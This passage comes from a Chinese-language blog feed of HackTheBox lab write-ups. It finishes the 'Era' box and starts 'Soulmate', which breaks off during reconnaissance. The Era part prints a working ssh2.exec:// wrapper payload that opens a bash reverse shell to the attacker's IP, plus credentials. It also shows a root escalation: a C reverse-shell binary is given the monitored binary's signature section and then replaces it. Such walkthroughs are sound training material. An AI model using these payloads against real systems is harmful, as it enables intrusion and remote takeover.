src="/2025/11/17/HackTheBox-Era/vmware_vk7ktaRSt8.png"></p><p>下载底下的sign文件，发现有个邮箱，不知道有什么用。</p><p><img src="/2025/11/17/HackTheBox-Era/vmware_4JRc6eCdGE.png"></p><h3 id="GetEric"><a href="#GetEric" class="headerlink" title="GetEric"></a>GetEric</h3><hr><p>之后这一块没想到好的利用点，回去看ftp服务，发现yuri用数据库里的凭证可以登录上去。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ftp</span> <span class="hljs-number">10.10.11.79</span> <br><span class="hljs-attribute">Connected</span> to <span class="hljs-number">10.10.11.79</span>.<br><span class="hljs-attribute">220</span> (vsFTPd <span class="hljs-number">3</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5</span>)<br><span class="hljs-attribute">Name</span> (<span class="hljs-number">10.10.11.79</span>:kali): yuri<br><span class="hljs-attribute">331</span> Please specify the password.<br><span class="hljs-attribute">Password</span>: <br><span class="hljs-attribute">230</span> Login successful.<br><span class="hljs-attribute">Remote</span> system type is UNIX.<br><span class="hljs-attribute">Using</span> binary mode to transfer files.<br><span class="hljs-attribute">ftp</span>&gt; ls<br><span class="hljs-attribute">229</span> Entering Extended Passive Mode (|||<span class="hljs-number">62972</span>|)<br><span class="hljs-attribute">150</span> Here comes the directory listing.<br><span class="hljs-attribute">drwxr</span>-xr-x    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">08</span>:<span class="hljs-number">42</span> apache2_conf<br><span class="hljs-attribute">drwxr</span>-xr-x    <span class="hljs-number">3</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Jul <span class="hljs-number">22</span> <span class="hljs-number">08</span>:<span class="hljs-number">42</span> php8.<span class="hljs-number">1</span>_conf<br></code></pre></td></tr></table></figure><p>进到php8.1目录里，发现ssh2服务可用。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs perl">sh2:<span class="hljs-regexp">//</span><br>ssh2:<span class="hljs-regexp">//</span> — 安全外壳协议 <span class="hljs-number">2</span><br><br>说明<br>ssh2.shell:<span class="hljs-regexp">//</span> ssh2.exec:<span class="hljs-regexp">//</span> ssh2.tunnel:<span class="hljs-regexp">//</span> ssh2.sftp:<span class="hljs-regexp">//</span> ssh2.scp:<span class="hljs-regexp">//</span> (PECL)<br><br>注意: 该封装器默认没有激活<br>为了使用 ssh2.*:<span class="hljs-regexp">//</span> 封装协议，必须从 » PECL 中安装有效的 » SSH2 扩展。<br><br>除了支持传统的 URI 登录信息，ssh2 封装协议也支持通过 URL 的主机（host）部分来复用打开连接。<br><br>用法<br>ssh2.shell:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/xterm<br>ssh2.exec:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/usr/<span class="hljs-keyword">local</span>/bin/somecmd<br>ssh2.tunnel:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/<span class="hljs-number">192.168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">14</span><br>ssh2.sftp:<span class="hljs-regexp">//us</span>er:pass<span class="hljs-variable">@example</span>.com:<span class="hljs-number">22</span>/path/to/filename<br></code></pre></td></tr></table></figure><p>同时审计之前的download.php,发现当用户为管理员时，可以控制fopen函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// BETA (Currently only available to the admin) - Showcase file instead of downloading it</span><br>&#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>] === <span class="hljs-string">&quot;true&quot;</span> &amp;&amp; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;erauser&#x27;</span>] === <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$fetched</span>[<span class="hljs-number">0</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$format</span>, <span class="hljs-string">&#x27;://&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-variable">$wrapper</span> = <span class="hljs-variable">$format</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$wrapper</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-variable">$full_path</span> = <span class="hljs-variable">$wrapper</span> ? <span class="hljs-variable">$wrapper</span> . <span class="hljs-variable">$file</span> : <span class="hljs-variable">$file</span>;<br><span class="hljs-comment">// Debug Output</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Opening: &quot;</span> . <span class="hljs-variable">$full_path</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file_content</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error reading file: &quot;</span> . <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>构造payload。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://file.era.htb/download.php?id=<span class="hljs-number">150</span>&amp;show=true&amp;format=ssh2.exec://eric:america@<span class="hljs-number">127.0.0.1:22</span>/bash+-i+%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>+/dev/tcp/<span class="hljs-number">10.10.16.20</span>/<span class="hljs-number">4444</span>+<span class="hljs-number">0</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>;<br></code></pre></td></tr></table></figure><p><img src="/2025/11/17/HackTheBox-Era/vmware_MPpau0AeHK.png"></p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>上传pspy64查看进程。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">51</span>:<span class="hljs-number">44</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12568</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12572</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12573</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12574</span>  | bash -c /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=???   PID=<span class="hljs-number">12575</span>  | ???<br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12576</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12577</span>  | openssl asn1parse -inform DER -in text_sig_section.bin <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12580</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12578</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12583</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12581</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12584</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">04</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12585</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">16</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12586</span>  | cat user.txt <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">38</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12589</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">47</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12591</span>  | ls --color=auto -la <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">52</span>:<span class="hljs-number">57</span> CMD: UID=<span class="hljs-number">1000</span>  PID=<span class="hljs-number">12594</span>  | /bin/bash -i <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12603</span>  | /usr/sbin/CRON -f -P <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12604</span>  | /bin/sh -c bash -c &#x27;/root/initiate_monitoring.sh&#x27; &gt;&gt; /opt/AV/periodic-checks/status.log <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12605</span>  | <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12606</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12608</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12607</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12610</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12609</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12611</span>  | grep -oP (?&lt;=UTF8STRING        :)Era Inc. <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12614</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12612</span>  | /bin/bash /root/initiate_monitoring.sh <br><span class="hljs-attribute">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">17</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">01</span> CMD: UID=<span class="hljs-number">0</span>     PID=<span class="hljs-number">12615</span>  | /bin/bash /root/initiate_monitoring.sh <br><br></code></pre></td></tr></table></figure><p>注意到root非常频繁的执行initiate_monitoring.sh这个任务</p><p>上传linpeas后注意到我们可写一个文件。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>ls -al<br>total <span class="hljs-number">32</span><br>drwxrwxr-- <span class="hljs-number">2</span> root devs  <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> .<br>drwxrwxr-- <span class="hljs-number">3</span> root devs  <span class="hljs-number">4096</span> <span class="hljs-title class_">Jul</span> <span class="hljs-number">22</span> <span class="hljs-number">08</span><span class="hljs-symbol">:</span><span class="hljs-number">42</span> ..<br>-rwxrw---- <span class="hljs-number">1</span> root devs <span class="hljs-number">16544</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> monitor<br>-rw-rw---- <span class="hljs-number">1</span> root devs   <span class="hljs-number">307</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">56</span> status.log<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>id<br>uid=<span class="hljs-number">1000</span>(eric) gid=<span class="hljs-number">1000</span>(eric) groups=<span class="hljs-number">1000</span>(eric),<span class="hljs-number">1001</span>(devs)<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span><br><br></code></pre></td></tr></table></figure><p>结合之前的进程，知道这个东西会被定期执行，写好替换即可。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"> cat pwn.<span class="hljs-function">c </span><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span> &#123;<br>    system(<span class="hljs-string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.20/9999 0&gt;&amp;1&#x27;&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>（这里要记得复制monitor的特征码，因为他会检测，直接上传是不行的。）</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ruby">eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>wget <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span>/pwn.c<br>--<span class="hljs-number">2025</span>-<span class="hljs-number">11</span>-<span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span>--  <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/10.10.16.20/pwn</span>.c<br><span class="hljs-title class_">Connecting</span> to <span class="hljs-number">10.10</span>.<span class="hljs-number">16.20</span><span class="hljs-symbol">:</span><span class="hljs-number">80</span>... connected.<br><span class="hljs-variable constant_">HTTP</span> request sent, awaiting response... <span class="hljs-number">200</span> <span class="hljs-variable constant_">OK</span><br><span class="hljs-title class_">Length</span>: <span class="hljs-number">101</span> [text/x-csrc]<br><span class="hljs-title class_">Saving</span> <span class="hljs-symbol">to:</span> ‘pwn.c’<br><br>pwn.c                                  <span class="hljs-number">100</span><span class="hljs-string">%[============================================================================&gt;]</span>     <span class="hljs-number">101</span>  --.-<span class="hljs-variable constant_">KB</span>/s    <span class="hljs-keyword">in</span> 0s      <br><br><span class="hljs-number">2025</span>-<span class="hljs-number">11</span>-<span class="hljs-number">17</span> <span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">59</span><span class="hljs-symbol">:</span><span class="hljs-number">57</span> (<span class="hljs-number">12.9</span> <span class="hljs-variable constant_">MB</span>/s) - ‘pwn.c’ saved [<span class="hljs-number">101</span>/<span class="hljs-number">101</span>]<br><br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>gcc pwn.c -o pwn<br>pwn.<span class="hljs-symbol">c:</span> <span class="hljs-title class_">In</span> function ‘main’:<br>pwn.<span class="hljs-symbol">c:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">5</span>: <span class="hljs-symbol">warning:</span> implicit declaration of function ‘system’ [-<span class="hljs-title class_">Wimplicit</span>-function-declaration]<br>    <span class="hljs-number">2</span> |<span class="hljs-params">     system(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.20/9999 0&gt;&amp;1&#x27;&quot;);</span><br></code></pre></td></tr></table></figure><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --dump-section .text_sig=text_sig /opt/<span class="hljs-title class_">AV</span>/periodic-checks/monitor<br><span class="hljs-symbol">objcopy:</span> unable to copy file <span class="hljs-string">&#x27;/opt/AV/periodic-checks/monitor&#x27;</span>; <span class="hljs-symbol">reason:</span> <span class="hljs-title class_">Text</span> file busy<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --dump-section .text_sig=text_sig /opt/<span class="hljs-title class_">AV</span>/periodic-checks/monitor<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>objcopy --add-section .text_sig=text_sig pwn<br>eric<span class="hljs-variable">@era</span><span class="hljs-symbol">:/opt/AV/periodic-checks</span><span class="hljs-variable">$ </span>cp pwn monitor <br><br></code></pre></td></tr></table></figure><p><img src="/2025/11/17/HackTheBox-Era/vmware_nclwVDriJa.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox-Soulmate</title>
    <link href="/2025/11/17/HackTheBox-Soulmate/"/>
    <url>/2025/11/17/HackTheBox-Soulmate/</url>
    
    <content type="html"><![CDATA[<p>污泥啊 血肉啊<br>石头和大地也是你啊<br>莫要哭 莫要怕<br>走过了东路就到家</p><hr><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">./rustscan -a 10.10.11.86<br>.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.<br>| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;<span class="hljs-emphasis">__ &#123;_   _&#125;&#123; &#123;__</span>  /  <span class="hljs-emphasis">___&#125; / &#123;&#125; \ |  `| |</span><br><span class="hljs-emphasis">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="hljs-emphasis">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="hljs-emphasis">The Modern Day Port Scanner.</span><br><span class="hljs-emphasis">__</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span><span class="hljs-emphasis">_____</span>___<br><span class="hljs-meta">: http://discord.skerritt.blog</span>         :<br><span class="hljs-meta">: https://github.com/RustScan/RustScan</span> :<br><span class="hljs-code"> --------------------------------------</span><br>RustScan: Because guessing isn&#x27;t hacking.<br><br>[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;<br>[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers<br>[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with <span class="hljs-emphasis">&#x27;--ulimit 5000&#x27;</span>. <br>Open 10.10.11.86:22<br>Open 10.10.11.86:80<br>[~] Starting Script(s)<br>[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-16 19:32 EST<br>Initiating Ping Scan at 19:32<br>Scanning 10.10.11.86 [4 ports]<br>Completed Ping Scan at 19:32, 0.10s elapsed (1 total hosts)<br>Initiating SYN Stealth Scan at 19:32<br>Scanning soulmate.htb (10.10.11.86) [2 ports]<br>Discovered open port 80/tcp on 10.10.11.86<br>Discovered open port 22/tcp on 10.10.11.86<br>Completed SYN Stealth Scan at 19:32, 0.15s elapsed (2 total ports)<br>Nmap scan report for soulmate.htb (10.10.11.86)<br>Host is up, received echo-reply ttl 63 (0.099s latency).<br>Scanned at 2025-11-16 19:32:18 EST for 0s<br><br>PORT   STATE SERVICE REASON<br>22/tcp open  ssh     syn-ack ttl 63<br>80/tcp open  http    syn-ack ttl 63<br><br>Read data files from: /usr/share/nmap<br>Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds<br><span class="hljs-code">           Raw packets sent: 6 (240B) | Rcvd: 6 (236B)</span><br><br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"> gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://soulmate.htb/ -t 30 --append-domain</span><br><span 